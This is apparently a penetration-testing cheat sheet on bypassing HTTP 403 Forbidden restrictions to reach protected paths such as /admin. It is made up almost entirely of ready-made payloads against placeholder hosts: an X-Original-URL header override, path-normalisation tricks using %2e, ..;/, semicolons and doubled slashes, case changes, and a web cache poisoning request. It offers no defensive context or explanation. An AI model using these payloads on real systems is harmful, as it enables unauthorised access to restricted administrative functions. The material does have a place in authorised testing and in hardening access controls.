# Bypass 403 (Forbidden)
### Using `X-Original-URL` header
```bash
# Normal Request (403)
GET /admin HTTP/1.1
Host: target.com

# Try this to bypass (200)
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

### Appending `%2e` after the first slash
```bash
# Normal Request (403)
http://target.com/admin

# Try this to bypass (200)
http://target.com/%2e/admin
```
### Try add dot `.` slash `/` and semicolon `;` in the URL
```bash
# Normal Request (403)
http://target.com/admin

# Try this to bypass (200)
http://target.com/secret/.
http://target.com//secret//
http://target.com/./secret/..
http://target.com/;/secret
http://target.com/.;/secret
http://target.com//;//secret
```
### Add `..;/` after the directory name
```bash
# Normal Request (403)
http://target.com/admin

# Try this to bypass (200)
http://target.com/admin..;/
```
### Try to uppercase the alphabet in the url
```bash
# Normal Request (403)
http://target.com/admin

# Try this to bypass (200)
http://target.com/aDmIN
```

## Via Web Cache Poisoning
```bash
GET /anything HTTP/1.1
Host: victim.com
X­-Original-­URL: /admin
```









